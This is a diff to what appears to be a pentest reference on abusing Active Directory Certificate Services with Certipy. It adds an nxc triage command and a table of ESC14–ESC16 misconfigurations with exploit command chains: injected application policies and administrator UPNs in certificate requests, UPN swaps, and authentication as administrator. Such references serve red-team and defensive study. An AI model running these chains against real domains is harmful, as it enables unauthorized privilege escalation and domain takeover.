@@ -32,6 +32,7 @@ Install: `pip install certipy-ad` (invoked as `certipy` or `certipy-ad`).
 certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
 certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable -stdout
 ```
+**Faster initial triage (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD -M adcs` lists CAs and template names quickly before a full `certipy find` pass.
 Key flags: `-text` (default, file), `-stdout` (print to console instead of file), `-json`, `-csv`, `-output prefix`, `-enabled` (only enabled templates), `-vulnerable` (only templates flagged exploitable given the caller's group memberships), `-oids` (issuance policy OIDs, relevant to ESC13/ESC15), `-hide-admins` (suppress noisy admin ACEs), `-dc-only` (LDAP-only, skip live CA RPC/HTTP checks — useful when CA is unreachable/firewalled), `-bloodhound` / `-old-bloodhound` (BloodHound-compatible export).
 
 ### `certipy req` — request/retrieve a certificate
@@ -94,6 +95,18 @@ These target the same weak-certificate-mapping and issuance-policy gaps that KB5
 | **ESC13** | Certificate template's issuance policy OID is linked (via `msPKI-Certificate-Policy` → `msDS-OIDToGroupLink`) to a privileged AD group | `certipy find -u 'user@domain' -p 'password' -dc-ip <IP> -vulnerable -stdout` (look for the OID→group link) → `certipy req -u 'user@domain' -p 'password' -ca CA_NAME -template TEMPLATE_NAME` → `certipy auth -pfx cert.pfx` to inherit the linked group's access |
 
 **Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation · https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html · https://www.hackingarticles.in/adcs-esc9-no-security-extension/ · https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/ · https://adminions.ca/books/adcs/page/esc13
+
+---
+
+## 2c. ESC14–ESC16 Summary Table
+
+| ESC | Misconfiguration | Certipy `find` detection | Exploit command sequence (short form) |
+|---|---|---|---|
+| **ESC14** | Weak **explicit certificate mapping** — a target account's `altSecurityIdentities` attribute maps it to a certificate an attacker can obtain/forge (X509IssuerSerialNumber/X509SubjectOnly/X509RFC822 mapping types can be spoofed) | `[!] Vulnerabilities: ESC14` on the account; `find` flags weak `altSecurityIdentities` mapping types | Enumerate the victim's `altSecurityIdentities` value, obtain/forge a certificate matching the weak mapping, then `certipy auth -pfx forged.pfx -username victim -domain corp.local -dc-ip <dcip>` |
+| **ESC15 (CVE-2024-49019, "EKUwu")** | V1 template with `Enrollee Supplies Subject` allows a requester to inject an arbitrary **Application Policy** (incl. Client Authentication / Certificate Request Agent) into the CSR even though the template doesn't define that EKU, bypassing V1's normally-fixed EKU set | `[!] Vulnerabilities: ESC15` on a V1 template; `find` notes schema version 1 + enrollee-supplied-subject | `certipy req -u user@corp.local -p pass -ca CA-NAME -target ca.corp.local -template WebServer -application-policies 'Client Authentication' -upn administrator@corp.local -sid S-1-5-21-...-500` → `certipy auth -pfx administrator.pfx -dc-ip <dcip>` |
+| **ESC16** | CA-wide flag disables the `szOID_NTDS_CA_SECURITY_EXT` security extension globally (`msPKI-Enrollment-Flag` / registry `DisableExtensionList` includes the security-extension OID) → **every** issued cert lacks the SID extension regardless of template, re-opening ESC1/ESC9/ESC10-style UPN-swap attacks CA-wide | `[!] Vulnerabilities: ESC16`; `find` shows the CA-level flag disabling the security extension | Same UPN-swap technique as ESC9/ESC10, but works against **any** enrollable template on the CA (no per-template weakness needed): `certipy account update -u attacker@domain -p pass -user victim -upn administrator@domain -dc-ip <IP>` → `certipy req -u victim@domain -p victimpass -ca CA_NAME -template User -dc-ip <IP>` → restore UPN → `certipy auth -pfx victim.pfx -dc-ip <IP>` |
+
+**Reference:** https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation · https://research.ifcr.dk/certipy-4-8-esc15-and-more-b3ffcb15e97e (EKUwu / ESC15) · https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019
 
 ---
 
